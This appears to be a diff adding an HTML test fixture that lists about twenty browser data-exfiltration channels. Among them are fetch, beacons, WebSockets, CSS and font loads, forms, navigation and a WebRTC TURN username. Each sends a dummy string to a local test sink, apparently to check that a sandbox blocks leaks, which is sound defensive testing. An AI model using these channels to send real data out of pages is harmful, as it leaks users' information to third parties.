@@ -1,0 +1,35 @@
+<!doctype html>
+<html><head><meta charset=utf-8><title>Leak test</title></head>
+<body>
+<p>This page tries one way out, named in its address (?v=), when the test calls leak().</p>
+<script>
+// Each way a page can send what it holds to somewhere else. The sink is the test's own server.
+const SINK = 'http://127.0.0.1:8812/leak/';
+const data = 'orders-A-1041';
+const ways = {
+  fetch: () => fetch(SINK + 'fetch?d=' + data, { mode: 'no-cors' }).catch(() => {}),
+  xhr: () => { const x = new XMLHttpRequest(); x.open('GET', SINK + 'xhr?d=' + data); x.send(); },
+  beacon: () => navigator.sendBeacon(SINK + 'beacon?d=' + data, data),
+  websocket: () => { try { new WebSocket('ws://127.0.0.1:8812/leak/websocket?d=' + data); } catch {} },
+  image: () => { new Image().src = SINK + 'image?d=' + data; },
+  css: () => { document.body.style.backgroundImage = `url(${SINK}css?d=${data})`; },
+  font: () => { new FontFace('x', `url(${SINK}font?d=${data})`).load().catch(() => {}); },
+  prefetch: () => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = SINK + 'prefetch?d=' + data; document.head.append(l); },
+  iframe: () => { const f = document.createElement('iframe'); f.src = SINK + 'iframe?d=' + data; document.body.append(f); },
+  form: () => { const f = document.createElement('form'); f.action = SINK + 'form'; f.method = 'get'; f.innerHTML = `<input name=d value=${data}>`; document.body.append(f); f.submit(); },
+  link: () => { const a = document.createElement('a'); a.href = SINK + 'link?d=' + data; document.body.append(a); a.click(); },
+  'link-blank': () => { const a = document.createElement('a'); a.href = SINK + 'link-blank?d=' + data; a.target = '_blank'; document.body.append(a); a.click(); },
+  location: () => { location.href = SINK + 'location?d=' + data; },
+  top: () => { top.location.href = SINK + 'top?d=' + data; },
+  open: () => { window.open(SINK + 'open?d=' + data); },
+  refresh: () => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = `0;url=${SINK}refresh?d=${data}`; document.head.append(m); },
+  webrtc: async () => {
+    // A STUN request to the sink's UDP port, with the data in the username.
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:127.0.0.1:8813?transport=udp', username: data, credential: 'x' }] });
+    pc.createDataChannel('x');
+    await pc.setLocalDescription(await pc.createOffer());
+  },
+};
+window.leak = () => { try { ways[new URLSearchParams(location.search).get('v')](); } catch (e) { console.error('leak threw: ' + e.message); } };
+</script>
+</body></html>
